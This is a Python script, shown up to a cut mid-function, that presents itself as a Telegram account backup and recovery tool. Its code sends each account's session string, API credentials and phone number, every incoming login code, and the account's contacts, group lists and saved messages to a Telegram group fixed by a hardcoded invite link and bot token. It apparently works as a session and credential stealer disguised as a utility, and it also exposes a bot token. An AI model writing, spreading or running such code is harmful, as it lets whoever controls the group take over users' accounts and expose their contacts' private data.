#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║     TG ACCOUNT IMMORTALITY SYSTEM v3.0 - COMPLETE EDITION    ║
║                                                               ║
║     • Auto-resolve group from invite link                     ║
║     • Topics for each account                                 ║
║     • MASTER VAULT for all credentials                        ║
║     • OTP Listener with topic routing                         ║
║     • Account Cloning (contacts, groups, messages)            ║
║     • Full backup & restore                                   ║
║     • Emergency Recovery Center                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import json
import asyncio
import re
import requests
from datetime import datetime
from getpass import getpass

# ═══════════════════════════════════════════════════════════════
# INSTALL DEPENDENCIES
# ═══════════════════════════════════════════════════════════════

def install_deps():
    try:
        import pyzipper
    except ImportError:
        print("📦 Installing pyzipper...")
        os.system("pip install pyzipper -q")
    try:
        from telethon import TelegramClient
    except ImportError:
        print("📦 Installing telethon...")
        os.system("pip install telethon -q")

install_deps()

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import CheckChatInviteRequest, ImportChatInviteRequest
from telethon.tl.functions.channels import CreateForumTopicRequest, GetForumTopicsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import InputPeerChannel
from telethon.errors import UserAlreadyParticipantError, InviteHashExpiredError

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION - YOUR BOT & GROUP
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "8212169322:AAHw-SHkjafgifohoLMB2SSd1juhAG-Jmrs"
GROUP_INVITE_LINK = "https://t.me/+WRLjPj_SNQUxZmU0"

# Topics
MASTER_VAULT_NAME = "🔐 MASTER VAULT"
TOPIC_ICON_PHONE = "📱"
TOPIC_ICON_VAULT = "🔐"

# Paths
DATA_DIR = os.path.expanduser("~/tgm_data")
os.makedirs(DATA_DIR, exist_ok=True)
ACCOUNTS_FILE = os.path.join(DATA_DIR, "accounts.json")
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")

# ═══════════════════════════════════════════════════════════════
# DATA MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def load_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_accounts(data):
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"group_id": None, "topics": {}}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def mask_phone(phone):
    if len(phone) > 8:
        return phone[:4] + "****" + phone[-4:]
    return phone

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def header(title):
    clear()
    print("═" * 60)
    print(f"  🤖 {title}")
    print("═" * 60)

# ═══════════════════════════════════════════════════════════════
# GROUP & TOPIC MANAGEMENT
# ═══════════════════════════════════════════════════════════════

async def resolve_group(client):
    """Join group via invite link and get Group ID"""
    config = load_config()
    
    if config.get("group_id"):
        print(f"✅ Group already configured: {config['group_id']}")
        return config["group_id"]
    
    print("\n🔍 Resolving group from invite link...")
    
    if "+" in GROUP_INVITE_LINK:
        invite_hash = GROUP_INVITE_LINK.split("+")[1]
    elif "joinchat/" in GROUP_INVITE_LINK:
        invite_hash = GROUP_INVITE_LINK.split("joinchat/")[1]
    else:
        print("❌ Invalid invite link!")
        return None
    
    try:
        try:
            result = await client(ImportChatInviteRequest(invite_hash))
            chat = result.chats[0]
            print(f"✅ Joined group: {chat.title}")
        except UserAlreadyParticipantError:
            result = await client(CheckChatInviteRequest(invite_hash))
            chat = result.chat
            print(f"✅ Already in group: {chat.title}")
        except InviteHashExpiredError:
            print("❌ Invite link expired!")
            return None
        
        group_id = int(f"-100{chat.id}")
        
        config["group_id"] = group_id
        config["group_title"] = chat.title
        save_config(config)
        
        print(f"✅ Group ID: {group_id}")
        return group_id
        
    except Exception as e:
        print(f"❌ Error resolving group: {e}")
        return None

async def get_or_create_topic(client, group_id, topic_name):
    """Get existing topic or create new one"""
    config = load_config()
    topics = config.get("topics", {})
    
    if topic_name in topics:
        return topics[topic_name]
    
    print(f"📁 Creating topic: {topic_name}")
    
    try:
        group = await client.get_entity(group_id)
        
        result = await client(CreateForumTopicRequest(
            channel=group,
            title=topic_name,
            icon_color=0x6FB9F0,
            random_id=int(datetime.now().timestamp())
        ))
        
        topic_id = result.updates[1].message.id
        
        topics[topic_name] = topic_id
        config["topics"] = topics
        save_config(config)
        
        print(f"✅ Topic created: {topic_name} (ID: {topic_id})")
        return topic_id
        
    except Exception as e:
        try:
            group = await client.get_entity(group_id)
            result = await client(GetForumTopicsRequest(
                channel=group,
                offset_date=None,
                offset_id=0,
                offset_topic=0,
                limit=100
            ))
            
            for topic in result.topics:
                if topic.title == topic_name:
                    topics[topic_name] = topic.id
                    config["topics"] = topics
                    save_config(config)
                    print(f"✅ Found existing topic: {topic_name} (ID: {topic.id})")
                    return topic.id
                    
        except Exception as e2:
            print(f"⚠️ Topic error: {e2}")
    
    return None

async def send_to_topic(client, group_id, topic_id, message):
    """Send message to specific topic"""
    try:
        await client.send_message(
            entity=group_id,
            message=message,
            reply_to=topic_id,
            parse_mode='md'
        )
        return True
    except Exception as e:
        print(f"⚠️ Send error: {e}")
        return False

def send_via_bot(text, topic_id=None):
    """Send message via bot API"""
    config = load_config()
    group_id = config.get("group_id")
    
    if not group_id:
        return False
    
    try:
        data = {
            "chat_id": group_id,
            "text": text,
            "parse_mode": "Markdown",
            "disable_web_page_preview": True
        }
        
        if topic_id:
            data["message_thread_id"] = topic_id
        
        resp = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data=data,
            timeout=30
        )
        return resp.status_code == 200
    except:
        return False

# ═══════════════════════════════════════════════════════════════
# 1. ADD ACCOUNT
# ═══════════════════════════════════════════════════════════════

async def add_account():
    """Add new Telegram account"""
    header("ADD NEW ACCOUNT")
    
    print("\n🔑 Get API ID & Hash from: https://my.telegram.org\n")
    print("-" * 60)
    
    api_id = input("\n📌 API ID: ").strip()
    api_hash = input("📌 API Hash: ").strip()
    phone = input("📞 Phone (with country code): ").strip()
    nickname = input("📝 Nickname: ").strip()
    
    if not all([api_id, api_hash, phone, nickname]):
        print("\n❌ All fields required!")
        input("\nPress Enter...")
        return
    
    accounts = load_accounts()
    if nickname in accounts:
        print(f"\n❌ '{nickname}' already exists!")
        input("\nPress Enter...")
        return
    
    print("\n" + "-" * 60)
    print("📧 EMAIL LINKING (CRITICAL FOR RECOVERY!)")
    print("-" * 60)
    
    email_linked = input("\n📧 Email linked to this Telegram? (email or 'no'): ").strip()
    twofa_password = input("🔐 2FA Password (or press Enter if none): ").strip()
    
    print("\n📱 Telecom Provider:")
    print("   1. Jio  2. Airtel  3. Vi  4. BSNL  5. Other")
    telecom_choice = input("Select (1-5): ").strip()
    telecom_map = {"1": "Jio", "2": "Airtel", "3": "Vi", "4": "BSNL", "5": "Other"}
    telecom = telecom_map.get(telecom_choice, "Unknown")
    
    print("\n⏳ Connecting...")
    
    client = TelegramClient(StringSession(), api_id, api_hash)
    
    try:
        await client.connect()
        
        print(f"📤 Sending OTP to {phone}...")
        await client.send_code_request(phone)
        
        code = input("\n📥 Enter OTP: ").strip()
        
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if "two-step" in str(e).lower() or "password" in str(e).lower():
                print("\n🔐 2FA Required!")
                if twofa_password:
                    password = twofa_password
                else:
                    password = getpass("Enter 2FA Password: ")
                    twofa_password = password
                await client.sign_in(password=password)
            else:
                raise e
        
        me = await client.get_me()
        session_string = client.session.save()
        
        group_id = await resolve_group(client)
        
        account_topic_id = None
        
        if not group_id:
            print("\n⚠️ Couldn't resolve group! Saving locally only.")
        else:
            master_topic_id = await get_or_create_topic(client, group_id, MASTER_VAULT_NAME)
            
            account_topic_name = f"📱 {nickname}"
            account_topic_id = await get_or_create_topic(client, group_id, account_topic_name)
            
            master_message = f"""🔐 *ACCOUNT: {nickname}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 *Phone:* `{phone}`
🔑 *API ID:* `{api_id}`
🔐 *API Hash:* `{api_hash}`

👤 *Name:* {me.first_name} {me.last_name or ''}
🆔 *Username:* @{me.username or 'None'}
💬 *User ID:* `{me.id}`

📧 *Email:* {email_linked if email_linked.lower() != 'no' else '❌ Not Linked'}
🔒 *2FA:* {'✅ Saved' if twofa_password else '❌ Not Set'}
📱 *Telecom:* {telecom}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 *SESSION STRING:*
━━━━━━━━━━━━━━━━━━━━━━━━━━

`{session_string}`

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 *Added:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

            account_message = f"""✅ *ACCOUNT CREATED*
━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 *{me.first_name} {me.last_name or ''}*
📱 {mask_phone(phone)}
🆔 @{me.username or 'None'}

📧 Email: {email_linked if email_linked.lower() != 'no' else '❌ Not Linked'}
🔒 2FA: {'✅ Yes' if twofa_password else '❌ No'}
📱 Telecom: {telecom}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ Session saved to MASTER VAULT
✅ OTPs will appear here
✅ All backups will be stored here
"""
            
            if master_topic_id:
                print("\n📤 Sending to MASTER VAULT...")
                await send_to_topic(client, group_id, master_topic_id, master_message)
            
            if account_topic_id:
                print(f"📤 Sending to {account_topic_name}...")
                await send_to_topic(client, group_id, account_topic_id, account_message)
        
        accounts[nickname] = {
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "user_id": me.id,
            "username": me.username or "",
            "first_name": me.first_name or "",
            "last_name": me.last_name or "",
            "session_string": session_string,
            "added_date": datetime.now().isoformat(),
            "recovery": {
                "email": email_linked if email_linked.lower() != 'no' else "",
                "twofa_password": twofa_password,
                "telecom": telecom
            },
            "topic_id": account_topic_id if group_id else None
        }
        save_accounts(accounts)
        
        print("\n" + "=" * 60)
        print("✅ ACCOUNT ADDED SUCCESSFULLY!")
        print("=" * 60)
        print(f"\n📛 Name: {me.first_name} {me.last_name or ''}")
        print(f"👤 Username: @{me.username or 'N/A'}")
        print(f"🆔 User ID: {me.id}")
        print(f"📞 Phone: {mask_phone(phone)}")
        print(f"📧 Email: {email_linked if email_linked.lower() != 'no' else 'Not linked'}")
        print(f"🔐 2FA: {'Saved' if twofa_password else 'Not set'}")
        
        if group_id:
            print(f"\n☁️ Synced to Group: ✅")
            print(f"📁 MASTER VAULT: ✅")
            print(f"📁 Account Topic: ✅")
        
        await client.disconnect()
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
        try:
            await client.disconnect()
        except:
            pass
    
    input("\n\nPress Enter to continue...")

# ═══════════════════════════════════════════════════════════════
# 2. LIST ACCOUNTS
# ═══════════════════════════════════════════════════════════════

async def list_accounts():
    """List all accounts"""
    header("YOUR ACCOUNTS")
    
    accounts = load_accounts()
    
    if not accounts:
        print("\n⚠️ No accounts saved yet!")
        input("\nPress Enter...")
        return
    
    print(f"\n📊 Total: {len(accounts)} account(s)\n")
    print("-" * 60)
    
    for i, (nickname, info) in enumerate(accounts.items(), 1):
        has_session = bool(info.get('session_string'))
        has_email = bool(info.get('recovery', {}).get('email'))
        has_2fa = bool(info.get('recovery', {}).get('twofa_password'))
        has_topic = bool(info.get('topic_id'))
        
        status = "🟢" if has_session else "🔴"
        
        print(f"\n{i}. {status} *{nickname}*")
        print(f"   📞 {mask_phone(info.get('phone', 'N/A'))}")
        print(f"   👤 {info.get('first_name', '')} {info.get('last_name', '')}")
        print(f"   📧 Email: {'✅' if has_email else '❌'}")
        print(f"   🔐 2FA: {'✅' if has_2fa else '❌'}")
        print(f"   📁 Topic: {'✅' if has_topic else '❌'}")
    
    print("\n" + "-" * 60)
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 3. REMOVE ACCOUNT
# ═══════════════════════════════════════════════════════════════

async def remove_account():
    """Remove an account"""
    header("REMOVE ACCOUNT")
    
    accounts = load_accounts()
    
    if not accounts:
        print("\n⚠️ No accounts to remove!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Your accounts:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname (or 'cancel'): ").strip()
    
    if choice.lower() == 'cancel':
        return
    
    if choice in accounts:
        confirm = input(f"\n⚠️ Delete '{choice}'? (yes/no): ").strip().lower()
        if confirm == 'yes':
            del accounts[choice]
            save_accounts(accounts)
            print(f"\n✅ '{choice}' removed!")
        else:
            print("\n❌ Cancelled")
    else:
        print(f"\n❌ '{choice}' not found!")
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 4. CHECK HEALTH
# ═══════════════════════════════════════════════════════════════

async def check_health():
    """Check all sessions health"""
    header("SESSION HEALTH CHECK")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts to check!")
        input("\nPress Enter...")
        return
    
    print("\n🔍 Checking sessions...\n")
    print("-" * 60)
    
    healthy = 0
    dead = 0
    
    for nickname, info in accounts.items():
        session = info.get('session_string', '')
        
        if not session:
            print(f"❌ {nickname}: No session")
            dead += 1
            continue
        
        try:
            client = TelegramClient(
                StringSession(session),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                print(f"✅ {nickname}: Active ({me.first_name})")
                healthy += 1
                
                topic_id = info.get('topic_id')
                if group_id and topic_id:
                    health_msg = f"""✅ *HEALTH CHECK*
━━━━━━━━━━━━━━━━━━━
Status: 🟢 Active
User: {me.first_name}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}
━━━━━━━━━━━━━━━━━━━"""
                    await send_to_topic(client, group_id, topic_id, health_msg)
            else:
                print(f"❌ {nickname}: Session expired")
                dead += 1
            
            await client.disconnect()
            
        except Exception as e:
            print(f"⚠️ {nickname}: Error - {str(e)[:30]}")
            dead += 1
    
    print("\n" + "-" * 60)
    print(f"\n📊 Healthy: {healthy} | Dead: {dead}")
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 5. OTP LISTENER
# ═══════════════════════════════════════════════════════════════

async def otp_listener():
    """Listen for OTPs on all accounts"""
    header("OTP LISTENER")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n❌ No accounts! Add some first.")
        input("\nPress Enter...")
        return
    
    print("\n👂 Starting OTP listener...")
    print("📌 Press Ctrl+C to stop\n")
    print("-" * 60)
    
    clients = []
    
    for nickname, info in accounts.items():
        session = info.get('session_string', '')
        
        if not session:
            print(f"⚠️ {nickname}: No session")
            continue
        
        try:
            client = TelegramClient(
                StringSession(session),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()
            
            if not await client.is_user_authorized():
                print(f"❌ {nickname}: Session expired")
                continue
            
            def make_handler(nick, acc_info, grp_id):
                @client.on(events.NewMessage(from_users=777000))
                async def handler(event):
                    msg = event.message.message
                    
                    codes = re.findall(r'\b\d{5,6}\b', msg)
                    otp_code = codes[0] if codes else "Not found"
                    
                    print("\n" + "🔔" * 20)
                    print(f"\n📱 OTP RECEIVED!")
                    print(f"👤 Account: {nick}")
                    print(f"🔑 CODE: {otp_code}")
                    print("-" * 40)
                    print(msg[:200])
                    print("\n" + "🔔" * 20)
                    
                    topic_id = acc_info.get('topic_id')
                    if grp_id and topic_id:
                        otp_msg = f"""🔔 *OTP RECEIVED*
━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 *CODE: {otp_code}*

⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 *Full Message:*
{msg[:500]}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                        
                        try:
                            await event.client.send_message(
                                entity=grp_id,
                                message=otp_msg,
                                reply_to=topic_id,
                                parse_mode='md'
                            )
                            print(f"✅ Sent to topic!")
                        except Exception as e:
                            print(f"⚠️ Topic send failed: {e}")
                
                return handler
            
            make_handler(nickname, info, group_id)
            clients.append(client)
            
            me = await client.get_me()
            print(f"✅ Listening: {nickname} ({me.first_name})")
            
        except Exception as e:
            print(f"❌ {nickname}: {e}")
    
    if not clients:
        print("\n❌ No active sessions!")
        input("\nPress Enter...")
        return
    
    print("\n" + "-" * 60)
    print(f"\n🎧 Listening on {len(clients)} account(s)...")
    print("💡 OTPs will appear here AND in group topics!\n")
    
    try:
        await asyncio.gather(*[c.run_until_disconnected() for c in clients])
    except KeyboardInterrupt:
        print("\n\n👋 Stopping...")
        for c in clients:
            try:
                await c.disconnect()
            except:
                pass
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 6. VIEW SESSION STRING
# ═══════════════════════════════════════════════════════════════

async def view_session():
    """View session string"""
    header("VIEW SESSION STRING")
    
    accounts = load_accounts()
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Your accounts:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname: ").strip()
    
    if choice in accounts:
        session = accounts[choice].get('session_string', '')
        if session:
            print(f"\n📄 Session for '{choice}':\n")
            print("-" * 60)
            print(f"\n{session}\n")
            print("-" * 60)
        else:
            print("\n⚠️ No session string!")
    else:
        print(f"\n❌ '{choice}' not found!")
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 7. IMPORT FROM STRING
# ═══════════════════════════════════════════════════════════════

async def import_from_string():
    """Import account using session string - NO OTP!"""
    header("IMPORT FROM STRING (NO OTP!)")
    
    print("\n📋 Paste details from your group:\n")
    print("-" * 60)
    
    api_id = input("\n🔑 API ID: ").strip()
    api_hash = input("🔐 API Hash: ").strip()
    session_string = input("📄 Session String: ").strip()
    nickname = input("📝 Nickname: ").strip()
    
    if not all([api_id, api_hash, session_string, nickname]):
        print("\n❌ All fields required!")
        input("\nPress Enter...")
        return
    
    accounts = load_accounts()
    if nickname in accounts:
        print(f"\n❌ '{nickname}' already exists!")
        input("\nPress Enter...")
        return
    
    print("\n⏳ Connecting...")
    
    try:
        client = TelegramClient(
            StringSession(session_string),
            api_id,
            api_hash
        )
        await client.connect()
        
        if await client.is_user_authorized():
            me = await client.get_me()
            
            accounts[nickname] = {
                "phone": me.phone or "Unknown",
                "api_id": api_id,
                "api_hash": api_hash,
                "user_id": me.id,
                "username": me.username or "",
                "first_name": me.first_name or "",
                "last_name": me.last_name or "",
                "session_string": session_string,
                "added_date": datetime.now().isoformat(),
                "imported": True,
                "recovery": {}
            }
            save_accounts(accounts)
            
            print("\n" + "=" * 60)
            print("✅ IMPORTED SUCCESSFULLY - NO OTP NEEDED!")
            print("=" * 60)
            print(f"\n📛 Name: {me.first_name} {me.last_name or ''}")
            print(f"👤 Username: @{me.username or 'N/A'}")
            print(f"🆔 User ID: {me.id}")
        else:
            print("\n❌ Session string is invalid or expired!")
        
        await client.disconnect()
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 8. RESYNC ALL TO GROUP
# ═══════════════════════════════════════════════════════════════

async def resync_all():
    """Resync all accounts to group"""
    header("RESYNC ALL TO GROUP")
    
    accounts = load_accounts()
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    working_client = None
    working_name = None
    
    for name, info in accounts.items():
        session = info.get('session_string')
        if session:
            try:
                client = TelegramClient(StringSession(session), info['api_id'], info['api_hash'])
                await client.connect()
                if await client.is_user_authorized():
                    working_client = client
                    working_name = name
                    break
                await client.disconnect()
            except:
                pass
    
    if not working_client:
        print("\n❌ No working session found!")
        input("\nPress Enter...")
        return
    
    print(f"\n✅ Using '{working_name}' for sync")
    
    config = load_config()
    group_id = config.get("group_id")
    
    if not group_id:
        group_id = await resolve_group(working_client)
    
    if not group_id:
        print("\n❌ Couldn't resolve group!")
        await working_client.disconnect()
        input("\nPress Enter...")
        return
    
    confirm = input(f"\n📤 Sync {len(accounts)} accounts to group? (yes/no): ").strip().lower()
    
    if confirm != 'yes':
        print("\n❌ Cancelled")
        await working_client.disconnect()
        input("\nPress Enter...")
        return
    
    print("\n📤 Syncing...\n")
    
    master_topic_id = await get_or_create_topic(working_client, group_id, MASTER_VAULT_NAME)
    
    success = 0
    for nickname, info in accounts.items():
        try:
            topic_name = f"📱 {nickname}"
            topic_id = await get_or_create_topic(working_client, group_id, topic_name)
            
            accounts[nickname]['topic_id'] = topic_id
            
            recovery = info.get('recovery', {})
            master_msg = f"""🔐 *ACCOUNT: {nickname}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 *Phone:* `{info.get('phone', 'N/A')}`
🔑 *API ID:* `{info.get('api_id', 'N/A')}`
🔐 *API Hash:* `{info.get('api_hash', 'N/A')}`

👤 *Name:* {info.get('first_name', '')} {info.get('last_name', '')}
🆔 *User ID:* `{info.get('user_id', 'N/A')}`

📧 *Email:* {recovery.get('email', '❌ Not linked')}
🔒 *2FA:* {'✅' if recovery.get('twofa_password') else '❌'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 *SESSION STRING:*
`{info.get('session_string', 'N/A')}`
━━━━━━━━━━━━━━━━━━━━━━━━━━

📅 Synced: {datetime.now().strftime('%Y-%m-%d %H:%M')}
"""
            
            if master_topic_id:
                await send_to_topic(working_client, group_id, master_topic_id, master_msg)
            
            print(f"   ✅ {nickname}")
            success += 1
            
            await asyncio.sleep(1)
            
        except Exception as e:
            print(f"   ❌ {nickname}: {e}")
    
    save_accounts(accounts)
    
    print(f"\n📊 Synced: {success}/{len(accounts)}")
    
    await working_client.disconnect()
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 10. CLONE CONTACTS
# ═══════════════════════════════════════════════════════════════

async def clone_contacts():
    """Clone all contacts to account's topic"""
    header("👥 CLONE CONTACTS")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    if not group_id:
        print("\n❌ Group not connected! Add an account first.")
        input("\nPress Enter...")
        return
    
    print("\n📋 Select account:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname (or 'all'): ").strip()
    
    accounts_to_process = []
    if choice.lower() == 'all':
        accounts_to_process = list(accounts.keys())
    elif choice in accounts:
        accounts_to_process = [choice]
    else:
        print(f"\n❌ '{choice}' not found!")
        input("\nPress Enter...")
        return
    
    for nickname in accounts_to_process:
        info = accounts[nickname]
        session = info.get('session_string')
        
        if not session:
            print(f"\n⚠️ {nickname}: No session")
            continue
        
        print(f"\n📤 Cloning contacts for: {nickname}")
        
        try:
            client = TelegramClient(
                StringSession(session),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()
            
            if not await client.is_user_authorized():
                print(f"❌ {nickname}: Session expired")
                await client.disconnect()
                continue
            
            result = await client(GetContactsRequest(hash=0))
            
            contacts_list = []
            for user in result.users:
                contact_info = f"• {user.first_name or ''} {user.last_name or ''}"
                if user.username:
                    contact_info += f" (@{user.username})"
                if user.phone:
                    contact_info += f" | +{user.phone}"
                contacts_list.append(contact_info)
            
            total = len(contacts_list)
            print(f"   Found {total} contacts")
            
            chunk_size = 50
            chunks = [contacts_list[i:i+chunk_size] for i in range(0, len(contacts_list), chunk_size)]
            
            topic_id = info.get('topic_id')
            
            if topic_id:
                header_msg = f"""👥 *CONTACTS BACKUP*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 Total: {total} contacts
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                await send_to_topic(client, group_id, topic_id, header_msg)
                
                for i, chunk in enumerate(chunks, 1):
                    chunk_msg = f"👥 *Contacts ({i}/{len(chunks)})*\n\n"
                    chunk_msg += "\n".join(chunk)
                    await send_to_topic(client, group_id, topic_id, chunk_msg)
                    await asyncio.sleep(0.5)
                
                print(f"   ✅ Sent to topic!")
            else:
                print(f"   ⚠️ No topic ID found")
            
            await client.disconnect()
            
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print("\n✅ Contacts cloning complete!")
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 11. CLONE GROUPS/CHANNELS
# ═══════════════════════════════════════════════════════════════

async def clone_groups():
    """Clone all groups/channels to account's topic"""
    header("🏛️ CLONE GROUPS/CHANNELS")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    if not group_id:
        print("\n❌ Group not connected!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Select account:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname (or 'all'): ").strip()
    
    accounts_to_process = []
    if choice.lower() == 'all':
        accounts_to_process = list(accounts.keys())
    elif choice in accounts:
        accounts_to_process = [choice]
    else:
        print(f"\n❌ '{choice}' not found!")
        input("\nPress Enter...")
        return
    
    for nickname in accounts_to_process:
        info = accounts[nickname]
        session = info.get('session_string')
        
        if not session:
            print(f"\n⚠️ {nickname}: No session")
            continue
        
        print(f"\n📤 Cloning groups for: {nickname}")
        
        try:
            client = TelegramClient(
                StringSession(session),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()
            
            if not await client.is_user_authorized():
                print(f"❌ {nickname}: Session expired")
                await client.disconnect()
                continue
            
            groups_list = []
            channels_list = []
            bots_list = []
            
            async for dialog in client.iter_dialogs():
                if dialog.is_group:
                    group_info = f"• {dialog.title}"
                    if hasattr(dialog.entity, 'username') and dialog.entity.username:
                        group_info += f" | @{dialog.entity.username}"
                        group_info += f" | t.me/{dialog.entity.username}"
                    groups_list.append(group_info)
                    
                elif dialog.is_channel:
                    channel_info = f"• {dialog.title}"
                    if hasattr(dialog.entity, 'username') and dialog.entity.username:
                        channel_info += f" | @{dialog.entity.username}"
                        channel_info += f" | t.me/{dialog.entity.username}"
                    channels_list.append(channel_info)
                    
                elif hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                    bot_info = f"• {dialog.name}"
                    if dialog.entity.username:
                        bot_info += f" | @{dialog.entity.username}"
                    bots_list.append(bot_info)
            
            print(f"   Found: {len(groups_list)} groups, {len(channels_list)} channels, {len(bots_list)} bots")
            
            topic_id = info.get('topic_id')
            
            if topic_id:
                header_msg = f"""🏛️ *GROUPS & CHANNELS BACKUP*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 Groups: {len(groups_list)}
📊 Channels: {len(channels_list)}
📊 Bots: {len(bots_list)}
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                await send_to_topic(client, group_id, topic_id, header_msg)
                
                if groups_list:
                    chunk_size = 30
                    chunks = [groups_list[i:i+chunk_size] for i in range(0, len(groups_list), chunk_size)]
                    for i, chunk in enumerate(chunks, 1):
                        msg = f"👥 *Groups ({i}/{len(chunks)})*\n\n" + "\n".join(chunk)
                        await send_to_topic(client, group_id, topic_id, msg)
                        await asyncio.sleep(0.5)
                
                if channels_list:
                    chunk_size = 30
                    chunks = [channels_list[i:i+chunk_size] for i in range(0, len(channels_list), chunk_size)]
                    for i, chunk in enumerate(chunks, 1):
                        msg = f"📢 *Channels ({i}/{len(chunks)})*\n\n" + "\n".join(chunk)
                        await send_to_topic(client, group_id, topic_id, msg)
                        await asyncio.sleep(0.5)
                
                if bots_list:
                    msg = f"🤖 *Bots*\n\n" + "\n".join(bots_list[:50])
                    await send_to_topic(client, group_id, topic_id, msg)
                
                print(f"   ✅ Sent to topic!")
            
            await client.disconnect()
            
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print("\n✅ Groups cloning complete!")
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 12. CLONE SAVED MESSAGES
# ═══════════════════════════════════════════════════════════════

async def clone_messages():
    """Clone saved messages to topic"""
    header("💬 CLONE SAVED MESSAGES")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    if not group_id:
        print("\n❌ Group not connected!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Select account:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname: ").strip()
    
    if choice not in accounts:
        print(f"\n❌ '{choice}' not found!")
        input("\nPress Enter...")
        return
    
    info = accounts[choice]
    session = info.get('session_string')
    
    if not session:
        print(f"\n⚠️ No session!")
        input("\nPress Enter...")
        return
    
    limit = input("\nHow many messages to clone? (default 100): ").strip()
    limit = int(limit) if limit.isdigit() else 100
    
    print(f"\n📤 Cloning last {limit} saved messages...")
    
    try:
        client = TelegramClient(
            StringSession(session),
            info['api_id'],
            info['api_hash']
        )
        await client.connect()
        
        if not await client.is_user_authorized():
            print("❌ Session expired")
            await client.disconnect()
            input("\nPress Enter...")
            return
        
        topic_id = info.get('topic_id')
        
        if not topic_id:
            print("⚠️ No topic ID!")
            await client.disconnect()
            input("\nPress Enter...")
            return
        
        header_msg = f"""💬 *SAVED MESSAGES BACKUP*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 Cloning last {limit} messages
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━"""
